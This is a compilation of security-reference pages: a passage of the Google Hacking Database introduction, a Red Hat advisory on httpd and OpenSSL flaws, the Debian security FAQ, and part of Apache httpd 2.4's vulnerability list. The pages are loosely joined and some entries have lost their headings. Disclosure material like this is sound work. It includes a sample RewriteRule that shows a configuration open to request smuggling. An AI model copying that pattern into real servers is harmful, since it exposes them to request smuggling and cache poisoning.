is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Topic

An update is now available for Red Hat JBoss Core Services on RHEL 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Red Hat JBoss Core Services is a set of supplementary software for Red Hat JBoss middleware products. This software, such as Apache HTTP Server, is common to multiple JBoss middleware products, and is packaged under Red Hat JBoss Core Services to allow for faster distribution of updates, and for a more consistent update experience.

This release of Red Hat JBoss Core Services Apache HTTP Server 2.4.23 Service Pack 1 serves as a replacement for Red Hat JBoss Core Services Apache HTTP Server 2.4.23, and includes bug fixes, which are documented in the Release Notes document linked to in the References.

Security Fix(es):

* A memory leak flaw was found in the way OpenSSL handled TLS status request extension data during session renegotiation. A remote attacker could cause a TLS server using OpenSSL to consume an excessive amount of memory and, possibly, exit unexpectedly after exhausting all available memory, if it enabled OCSP stapling support. (CVE-2016-6304)
* It was discovered that the mod\_session\_crypto module of httpd did not use any mechanisms to verify integrity of the encrypted session data stored in the user's browser. A remote attacker could use this flaw to decrypt and modify session data using a padding oracle attack. (CVE-2016-0736)
* It was discovered that the mod\_auth\_digest module of httpd did not properly check for memory allocation failures. A remote attacker could use this flaw to cause httpd child processes to repeatedly crash if the server used HTTP digest authentication. (CVE-2016-2161)
* A timing attack flaw was found in OpenSSL that could allow a malicious user with local access to recover ECDSA P-256 private keys. (CVE-2016-7056)
* A denial of service flaw was found in the way the TLS/SSL protocol defined processing of ALERT packets during a connection handshake. A remote attacker could use this flaw to make a TLS/SSL server consume an excessive amount of CPU and fail to accept connections from other clients. (CVE-2016-8610)
* It was discovered that the HTTP parser in httpd incorrectly allowed certain characters not permitted by the HTTP protocol specification to appear unencoded in HTTP request headers. If httpd was used in conjunction with a proxy or backend server that interpreted those characters differently, a remote attacker could possibly use this flaw to inject data into HTTP responses, resulting in proxy cache poisoning. (CVE-2016-8743)
* A vulnerability was found in httpd's handling of the LimitRequestFields directive in mod\_http2, affecting servers with HTTP/2 enabled. An attacker could send crafted requests with headers larger than the server's available memory, causing httpd to crash. (CVE-2016-8740)

Red Hat would like to thank the OpenSSL project for reporting CVE-2016-6304 and Shi Lei (Gear Team of Qihoo 360 Inc.) for reporting CVE-2016-8610. Upstream acknowledges Shi Lei (Gear Team of Qihoo 360 Inc.) as the original reporter of CVE-2016-6304.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

For the update to take effect, all services linked to the OpenSSL library must be restarted, or the system rebooted. After installing the updated packages, the httpd daemon will be restarted automatically.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

* [Plugins](https://www.tenable.com/cve/CVE-2016-0736/plugins)

#### Description

In Apache HTTP Server versions 2.4.0 to 2.4.23, mod\_session\_crypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC.

# Apache HTTP Server 2.4 vulnerabilities

This page lists all security vulnerabilities fixed in released versions of Apache HTTP Server 2.4. Each vulnerability is given a security [impact rating](/security/impact_levels.html) by the Apache security team - please note that this rating may well vary from platform to platform. We also list the versions the flaw is known to affect, and where a flaw has not been verified list the version with a question mark.

Please note that if a vulnerability is shown below as being fixed in a "-dev" release then this means that a fix has been applied to the development source tree and will be part of an upcoming full release.

Please send comments or corrections for these vulnerabilities to the [Security Team](/security_report.html).

*The initial GA release, Apache httpd 2.4.1, includes fixes for all vulnerabilities which have been resolved in Apache httpd 2.2.22 and all older releases. Consult the [Apache httpd 2.2 vulnerabilities list](vulnerabilities_22.html) for more information.*

# Fixed in Apache HTTP Server 2.4.62

### important: Apache HTTP Server: source code disclosure with handlers configured via AddType ([CVE-2024-40725](https://www.cve.org/CVERecord?id=CVE-2024-40725))

A partial fix for CVE-2024-39884 in the core of Apache HTTP Server 2.4.61 ignores some use of the legacy content-type based configuration of handlers. "AddType" and similar configuration, under some circumstances where files are requested indirectly, result in source code disclosure of local content. For example, PHP scripts may be served instead of interpreted.

Users are recommended to upgrade to version 2.4.62, which fixes this issue.

### important: Apache HTTP Server: SSRF with mod\_rewrite in server/vhost context on Windows ([CVE-2024-40898](https://www.cve.org/CVERecord?id=CVE-2024-40898))

SSRF in Apache HTTP Server on Windows with mod\_rewrite in server/vhost context, allows to potentially leak NTLM hashes to a malicious server via SSRF and malicious requests.

Users are recommended to upgrade to version 2.4.62 which fixes this issue.

A regression in the core of Apache HTTP Server 2.4.60 ignores some use of the legacy content-type based configuration of handlers. "AddType" and similar configuration, under some circumstances where files are requested indirectly, result in source code disclosure of local content. For example, PHP scripts may be served instead of interpreted.

### important: Apache HTTP Server on WIndows UNC SSRF ([CVE-2024-38472](https://www.cve.org/CVERecord?id=CVE-2024-38472))

SSRF in Apache HTTP Server on Windows allows to potentially leak NTLM hashes to a malicious server via SSRF and malicious requests or content

Users are recommended to upgrade to version 2.4.60 which fixes this issue. Note: Existing configurations that access UNC paths will have to configure new directive "UNCList" to allow access during request processing.

### moderate: Apache HTTP Server proxy encoding problem ([CVE-2024-38473](https://www.cve.org/CVERecord?id=CVE-2024-38473))

Encoding problem in mod\_proxy in Apache HTTP Server 2.4.59 and earlier allows request URLs with incorrect encoding to be sent to backend services, potentially bypassing authentication via crafted requests. This affects configurations where mechanisms other than ProxyPass/ProxyPassMatch or RewriteRule with the 'P' flag are used to configure a request to be proxied, such as SetHandler or inadvertent proxying via CVE-2024-39573. Note that these alternate mechanisms may be used within .htaccess.

Users are recommended to upgrade to version 2.4.60, which fixes this issue.

### important: Apache HTTP Server weakness with encoded question marks in backreferences ([CVE-2024-38474](https://www.cve.org/CVERecord?id=CVE-2024-38474))

Substitution encoding issue in mod\_rewrite in Apache HTTP Server 2.4.59 and earlier allows attacker to execute scripts in directories permitted by the configuration but not directly reachable by any URL or source disclosure of scripts meant to only to be executed as CGI.

Users are recommended to upgrade to version 2.4.60, which fixes this issue.

Some RewriteRules that capture and substitute unsafely will now fail unless rewrite flag "UnsafeAllow3F" is specified.

### important: Apache HTTP Server weakness in mod\_rewrite when first segment of substitution matches filesystem path. ([CVE-2024-38475](https://www.cve.org/CVERecord?id=CVE-2024-38475))

Improper escaping of output in mod\_rewrite in Apache HTTP Server 2.4.59 and earlier allows an attacker to map URLs to filesystem locations that are permitted to be served by the server but are not intentionally/directly reachable by any URL, resulting in code execution or source code disclosure.

Substitutions in server context that use a backreferences or variables as the first segment of the substitution are affected. Some unsafe RewiteRules will be broken by this change and the rewrite flag "UnsafePrefixStat" can be used to opt back in once ensuring the substitution is appropriately constrained.

An attacker, opening a HTTP/2 connection with an initial window size of 0, was able to block handling of that connection indefinitely in Apache HTTP Server. This could be used to exhaust worker resources in the server, similar to the well known "slow loris" attack pattern.

This has been fixed in version 2.4.58, so that such connection are terminated properly after the configured connection timeout.

This issue affects Apache HTTP Server: from 2.4.55 through 2.4.57.

### moderate: Apache HTTP Server: HTTP/2 stream memory not reclaimed right away on RST ([CVE-2023-45802](https://www.cve.org/CVERecord?id=CVE-2023-45802))

When a HTTP/2 stream was reset (RST frame) by a client, there was a time window were the request's memory resources were not reclaimed immediately. Instead, de-allocation was deferred to connection close. A client could send new requests and resets, keeping the connection busy and open and causing the memory footprint to keep on growing. On connection close, all resources were reclaimed, but the process might run out of memory before that.

This was found by the reporter during testing of CVE-2023-44487 (HTTP/2 Rapid Reset Exploit) with their own test client. During "normal" HTTP/2 use, the probability to hit this bug is very low. The kept memory would not become noticeable before the connection closes or times out.

Users are recommended to upgrade to version 2.4.58, which fixes the issue.

### important: HTTP request splitting with mod\_rewrite and mod\_proxy ([CVE-2023-25690](https://www.cve.org/CVERecord?id=CVE-2023-25690))

Some mod\_proxy configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack.

Configurations are affected when mod\_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target using variable substitution.

For example, something like:

RewriteEngine on

RewriteRule "^/here/(.\*)" "http://example.com:8080/elsewhere?$1"; [P]

ProxyPassReverse /here/ http://example.com:8080/

Request splitting/smuggling could result in bypass of access controls in the proxy server, proxying unintended URLs to existing origin servers, and cache poisoning.

### important: NULL pointer dereference on specially crafted HTTP/2 request ([CVE-2021-31618](https://www.cve.org/CVERecord?id=CVE-2021-31618))

Apache HTTP Server protocol handler for the HTTP/2 protocol checks received request headers against the size limitations as configured for the server and used for the HTTP/1 protocol as well. On violation of these restrictions and HTTP response is sent to the client with a status code indicating why the request was rejected.

This rejection response was not fully initialised in the HTTP/2 protocol handler if the offending header was the very first one received or appeared in a a footer. This led to a NULL pointer dereference on initialised memory, crashing reliably the child process. Since such a triggering HTTP/2 request is easy to craft and submit, this can be exploited to DoS the server.

This issue affected mod\_http2 1.15.17 and Apache HTTP Server version 2.4.47 only. Apache HTTP Server 2.4.47 was never released.

### important: Push Diary Crash on Specifically Crafted HTTP/2 Header ([CVE-2020-9490](https://www.cve.org/CVERecord?id=CVE-2020-9490))

In Apache HTTP Server versions 2.4.20 to 2.4.43, a specially crafted value for the 'Cache-Digest' header in a HTTP/2 request would result in a crash when the server actually tries to HTTP/2 PUSH a resource afterwards. Configuring the HTTP/2 feature via "H2Push off" will mitigate this vulnerability for unpatched servers.

A limited cross-site scripting issue was reported affecting the mod\_proxy error page. An attacker could cause the link on the error page to be malfomed and instead point to a page of their choice. This would only be exploitable where a server was set up with proxying enabled but was misconfigured in such a way that the Proxy Error page was displayed. We have taken this opportunity to also remove request data from many other in-built error messages. Note however this issue did not affect them directly and their output was already escaped to prevent cross-site scripting attacks.

### important: Apache HTTP Server privilege escalation from modules' scripts ([CVE-2019-0211](https://www.cve.org/CVERecord?id=CVE-2019-0211))

In Apache HTTP Server 2.4 releases 2.4.17 to 2.4.38, with MPM event, worker or prefork, code executing in less-privileged child processes or threads (including scripts executed by an in-process scripting interpreter) could execute arbitrary code with the privileges of the parent process (usually root) by manipulating the scoreboard. Non-Unix systems are not affected.

A bug exists in the way mod\_ssl handled client renegotiations. A remote attacker could send a carefully crafted request that would cause mod\_ssl to enter a loop leading to a denial of service. This bug can be only triggered with Apache HTTP Server version 2.4.37 when using OpenSSL version 1.1.1 or later, due to an interaction in changes to handling of renegotiation attempts.

### low: Out of bound write in mod\_authnz\_ldap when using too small Accept-Language values ([CVE-2017-15710](https://www.cve.org/CVERecord?id=CVE-2017-15710))

mod\_authnz\_ldap, if configured with AuthLDAPCharsetConfig, uses the Accept-Language header value to lookup the right charset encoding when verifying the user's credentials. If the header value is not present in the charset conversion table, a fallback mechanism is used to truncate it to a two characters value to allow a quick retry (for example, 'en-US' is truncated to 'en'). A header value of less than two characters forces an out of bound write of one NUL byte to a memory location that is not part of the string. In the worst case, quite unlikely, the process would crash which could be used as a Denial of Service attack. In the more likely case, this memory is already reserved for future use and the issue has no effect at all.

### moderate: Tampering of mod\_session data for CGI applications ([CVE-2018-1283](https://www.cve.org/CVERecord?id=CVE-2018-1283))

When mod\_session is configured to forward its session data to CGI applications (SessionEnv on, not the default), a remote user may influence their content by using a "Session" header. This comes from the "HTTP\_SESSION" variable name used by mod\_session to forward its data to CGIs, since the prefix "HTTP\_" is also used by the Apache HTTP Server to pass HTTP header fields, per CGI specifications. The severity is set to Moderate because "SessionEnv on" is not a default nor common configuration, it should be considered more severe when this is the case though, because of the possible remote exploitation.

When an unrecognized HTTP Method is given in an <Limit {method}> directive in an .htaccess file, and that .htaccess file is processed by the corresponding request, the global methods table is corrupted in the current worker process, resulting in erratic behaviour. This behavior may be avoided by listing all unusual HTTP Methods in a global httpd.conf RegisterHttpMethod directive in httpd release 2.4.25 and later.

### important: ap\_get\_basic\_auth\_pw() Authentication Bypass ([CVE-2017-3167](https://www.cve.org/CVERecord?id=CVE-2017-3167))

Use of the ap\_get\_basic\_auth\_pw() by third-party modules outside of the authentication phase may lead to authentication requirements being bypassed. Third-party module writers SHOULD use ap\_get\_basic\_auth\_components(), available in 2.2.34 and 2.4.26, instead of ap\_get\_basic\_auth\_pw(). Modules which call the legacy ap\_get\_basic\_auth\_pw() during the authentication phase MUST either immediately authenticate the user after the call, or else stop the request immediately with an error response, to avoid incorrectly authenticating the current request.

### important: ap\_find\_token() Buffer Overread ([CVE-2017-7668](https://www.cve.org/CVERecord?id=CVE-2017-7668))

The HTTP strict parsing changes added in 2.2.32 and 2.4.24 introduced a bug in token list parsing, which allows ap\_find\_token() to search past the end of its input string. By maliciously crafting a sequence of request headers, an attacker may be able to cause a segmentation fault, or to force ap\_find\_token() to return an incorrect value.

### low: Padding Oracle in Apache mod\_session\_crypto ([CVE-2016-0736](https://www.cve.org/CVERecord?id=CVE-2016-0736))

Prior to Apache HTTP release 2.4.25, mod\_sessioncrypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC. An authentication tag (SipHash MAC) is now added to prevent such attacks.

### n/a: HTTP\_PROXY environment variable "httpoxy" mitigation ([CVE-2016-5387](https://www.cve.org/CVERecord?id=CVE-2016-5387))

HTTP\_PROXY is a well-defined environment variable in a CGI process, which collided with a number of libraries which failed to avoid colliding with this CGI namespace. A mitigation is provided for the httpd CGI environment to avoid populating the "HTTP\_PROXY" variable from a "Proxy:" header, which has never been registered by IANA. This workaround and patch are documented in the ASF Advisory at asf-httpoxy-response.txt and incorporated in the 2.4.25 and 2.2.32 releases. Note: This is not assigned an httpd severity, as it is a defect in other software which overloaded well-established CGI environment variables, and does not reflect an error in HTTP server software.

Acknowledgements: We would like to thank Dominic Scheirlinck and Scott Geary of Vend for reporting and proposing a fix for this issue.

### low: HTTP/2 CONTINUATION denial of service ([CVE-2016-8740](https://www.cve.org/CVERecord?id=CVE-2016-8740))

### important: Apache HTTP Request Parsing Whitespace Defects ([CVE-2016-8743](https://www.cve.org/CVERecord?id=CVE-2016-8743))

Apache HTTP Server, prior to release 2.4.25 (and 2.2.32), accepted a broad pattern of unusual whitespace patterns from the user-agent, including bare CR, FF, VTAB in parsing the request line and request header lines, as well as HTAB in parsing the request line. Any bare CR present in request lines was treated as whitespace and remained in the request field member "the\_request", while a bare CR in the request header field name would be honored as whitespace, and a bare CR in the request header field value was retained the input headers array. Implied additional whitespace was accepted in the request line and prior to the ':' delimiter of any request header lines.

RFC7230 Section 3.5 calls out some of these whitespace exceptions, and section 3.2.3 eliminated and clarified the role of implied whitespace in the grammer of this specification. Section 3.1.1 requires exactly one single SP between the method and request-target, and between the request-target and HTTP-version, followed immediately by a CRLF sequence. None of these fields permit any (unencoded) CTL character whatsoever. Section 3.2.4 explicitly disallowed any whitespace from the request header field prior to the ':' character, while Section 3.2 disallows all CTL characters in the request header line other than the HTAB character as whitespace.

These defects represent a security concern when httpd is participating in any chain of proxies or interacting with back-end application servers, either through mod\_proxy or using conventional CGI mechanisms. In each case where one agent accepts such CTL characters and does not treat them as whitespace, there is the possiblity in a proxy chain of generating two responses from a server behind the uncautious proxy agent. In a sequence of two requests, this results in request A to the first proxy being interpreted as requests A + A' by the backend server, and if requests A and B were submitted to the first proxy in a keepalive connection, the proxy may interpret response A' as the response to request B, polluting the cache or potentially serving the A' content to a different downstream user-agent.

These defects are addressed with the release of Apache HTTP Server 2.4.25 and coordinated by a new directive; HttpProtocolOptions Strict which is the default behavior of 2.4.25 and later.

By toggling from 'Strict' behavior to 'Unsafe' behavior, some of the restrictions may be relaxed to allow some invalid HTTP/1.1 clients to communicate with the server, but this will reintroduce the possibility of the problems described in this assessment. Note that relaxing the behavior to 'Unsafe' will still not permit raw CTLs other than HTAB (where permitted), but will allow other RFC requirements to not be enforced, such as exactly two SP characters in the request line.

### low: ap\_some\_auth\_required API unusable ([CVE-2015-3185](https://www.cve.org/CVERecord?id=CVE-2015-3185))

